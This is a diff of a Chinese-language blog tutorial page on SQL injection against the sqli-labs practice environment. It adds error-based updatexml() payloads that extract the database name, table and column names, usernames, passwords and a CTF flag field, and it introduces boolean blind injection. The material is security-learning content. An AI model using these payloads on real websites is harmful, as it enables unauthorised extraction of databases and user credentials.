@@ -226,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7.3k 字
+          8k 字
         
       </span>
     
@@ -237,7 +237,7 @@
         
         
         
-          62 分钟
+          67 分钟
         
       </span>
     
@@ -344,17 +344,21 @@
 </li>
 </ol>
 <p>获取数据库名字</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> updatexml(1,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(database()),<span class="hljs-string">&#x27;^&#x27;</span>),1) --+<br></code></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> updatexml(1,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(database()),<span class="hljs-string">&#x27;^&#x27;</span>),1) --+<br><br>?<span class="hljs-attribute">id</span>=1&quot;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)#<br></code></pre></td></tr></table></figure>
 
 <p>获取当前数据库中表的名字</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> updatexml(1,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(select table_name <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> limit 0,1),<span class="hljs-string">&#x27;^&#x27;</span>),1) --+<br></code></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> updatexml(1,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(select table_name <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> limit 0,1),<span class="hljs-string">&#x27;^&#x27;</span>),1) --+<br><br>?<span class="hljs-attribute">id</span>=1&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;security&#x27;)),0x7e),1)#<br></code></pre></td></tr></table></figure>
 
 <p>在 table_schema&#x3D;’security’ 后加上 limit 0,1，显示第一行（显示第0行的往下一行，不包括第0行）如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。</p>
 <p>爆表中的字段</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> updatexml(1,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> limit 0,1 ),<span class="hljs-string">&#x27;^&#x27;</span>),1) --+<br></code></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> updatexml(1,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> limit 0,1 ),<span class="hljs-string">&#x27;^&#x27;</span>),1) --+<br><br>?<span class="hljs-attribute">id</span>=1&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=&#x27;security&#x27;)||(table_name=&#x27;users&#x27;)),0x7e),1)#<br></code></pre></td></tr></table></figure>
 
 <p>爆字段中的内容</p>
 <pre><code class="hljs">?id=1&#39; and updatexml(1,concat(&#39;^&#39;,(select group_concat(username,&quot;--&quot;,password) from users limit 0,1 ),&#39;^&#39;),1) --+
+
+?id=1&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#
+
+?id=1&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1))#
 </code></pre>
 <p>基于布尔的盲注</p>
 <p>布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例</p>
